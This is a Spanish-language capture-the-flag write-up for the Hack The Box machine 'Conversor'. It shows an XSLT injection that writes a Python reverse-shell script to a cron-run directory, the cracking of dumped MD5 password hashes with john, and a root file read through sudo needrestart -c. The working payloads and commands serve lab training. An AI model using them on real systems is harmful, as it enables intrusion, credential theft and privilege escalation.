### 1. Enumeración inicial

Nos encontramos ante una máquina Linux con los **puertos 22 y 80 abiertos**, correspondientes a **SSH** y **HTTP**.

Vamos a añadir al **/etc/hosts** el dominio `conversor.htb` y empezamos a enumerar el sitio web.

Nos encontramos con una página diseñada para juntar ficheros **XML** y **XSLT**. De primeras se me ocurre subir cualquier fichero XML, y probar un payload en el fichero **XSLT** para ver si ocurre un **Server-Side Injection**. Primero vamos a subir un **XSLT** para recopilar algo de información sobre el entorno y ver el procesador XSLT que usa el servidor.

Archivo XML a subir:

```xml
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```

Archivo **XSLT** de reconocimiento:

```xslt
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        Version: <xsl:value-of select="system-property('xsl:version')"/><br/>
        Vendor: <xsl:value-of select="system-property('xsl:vendor')"/><br/>
        Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')"/><br/>
        Product: <xsl:value-of select="system-property('xsl:product-name')"/><br/>
        Product Version: <xsl:value-of select="system-property('xsl:product-version')"/>
    </xsl:template>
</xsl:stylesheet>
```

Al abrir el html generado en base a los dos archivos, vemos que el xslt me lo ha procesado correctamente:

```xml
Version: 1.0
Vendor: libxslt
Vendor URL: http://xmlsoft.org/XSLT/
Product:
Product Version:
```

El servidor usa de procesador **libxslt** (biblioteca XSLT de C).

---
### 2. Análisis del código fuente y explotación XSLT

Ahora bien, probando payloads convencionales para ganar LFI o RCE no funcionan de primeras. Si miramos el **About** del sitio web vemos que nos permite **descargar el código fuente de la misma**. Entre los archivos, hay un **install.md** con el siguiente contenido:

```markdown
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""

```

Esto nos dice que en el servidor, se está ejecutando cualquier script que se encuentre en `/var/www/conversor.htb/scripts/*.py` cada minuto. 

Vamos a subir un XSLT con un **payload malicioso** usando la extensión **EXSLT** (específicamente `http://exslt.org/common`), que permite escribir archivos en el sistema mediante el elemento `<exploit:document>`, y vamos a escribir directamente en `/var/www/conversor.htb/scripts/*.py` **un script Python que se encargue de mandarnos una reverse shell al ser ejecutado**. Recuerden cambiar la dirección IP y el puerto de escucha por el de vuestra máquina de atacante.

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
#!/usr/bin/env python3
import socket, os, pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.209", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
    </exploit:document>
    Script escrito exitosamente!
  </xsl:template>
</xsl:stylesheet>
```

Veremos que nos llega la reverse shell cuando se ejecute el script en el servidor:

```bash
❯ penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.10.0.100 • 192.168.0.1 • 172.17.0.1 • 10.10.14.209
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from conversor~10.10.11.92-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to deploy Python Agent...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/abra/.penelope/sessions/conversor~10.10.11.92-Linux-x86_64/2025_11_10-19_15_02-808.log 📜
────────────────────────────────────────────────────────────────────────────────────
bash-5.1$ whoami
www-data
```

--- 
### 3. Escalada a fismathack y user flag

Ahora toca escalar privilegios a algún usuario local de la máquina, hay un fichero `user.db` que contiene la contraseña hasheada del usuario **fismathack**:

```bash
bash-5.1$ sqlite3 users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> SELECT * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|admin|21232f297a57a5a743894a0e4a801fc3
bash-5.1$ pwd
/var/www/conversor.htb
```

El formato es MD5, vamos a usar **john** con el diccionario **rockyou.txt** para crackear el hash:

```bash
john --format=raw-md5 hash.txt --wordlist=/home/abra/Documentos/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Keepmesafeandwarm (fismathack)     
1g 0:00:00:00 DONE (2025-11-10 19:20) 1.266g/s 13889Kp/s 13889Kc/s 13889KC/s Keisean1..Keeperhut141
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Tenemos las credenciales `fismathack:Keepmesafeandwarm`, ejecutamos **su fismathack** o nos conectamos por SSH y en el home del usuario nos encontramos con la **user flag**.

--- 
### 4. Escalada de privilegios a root mediante needrestart

Toca ir a por la root flag. Si enumeramos los permisos del usuario, nos daremos cuenta de que puede ejecutar `/usr/sbin/needrestart` con sudo sin necesidad de contraseña:

```bash
sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Vamos a probar a ejecutarlo a ver que nos encontramos:

```bash
sudo /usr/sbin/needrestart
Scanning processes...                                                               
Scanning candidates...                                                              
Scanning linux images...                                                            

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

Parece que intenta hacer una actualización del sistema. Vamos a mandarle la flag `--help` para ver de que se trata exactamente este binario y como se usa:

```bash
bash-5.1$ sudo /usr/sbin/needrestart --help

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

Usage:
```

Es un binario `needrestart v3.7`. Se le puede pasar un parámetro `-c` para especificar el archivo de configuración a usar, la clave está en que **el mensaje de error que salta cuando está mal formulado el archivo "de configuración" especificado nos chiva su contenido**, por lo tanto podemos usar el binario para hacer un **LFI con privilegios de root, y leer `/root/root.txt` directamente**:

```bash
bash-5.1$ sudo /usr/sbin/needrestart -c /root/root.txt
Bareword found where operator expected at (eval 14) line 1, near "FLAG CONTENT"
	(Missing operator before FLAG CONTENT?)
Error parsing /root/root.txt: Illegal octal digit '8' at (eval 14) line 1, at end of line
syntax error at (eval 14) line 2, near "FLAG CONTENT

"
```

Con esto hemos terminado de vulnerar la máquina.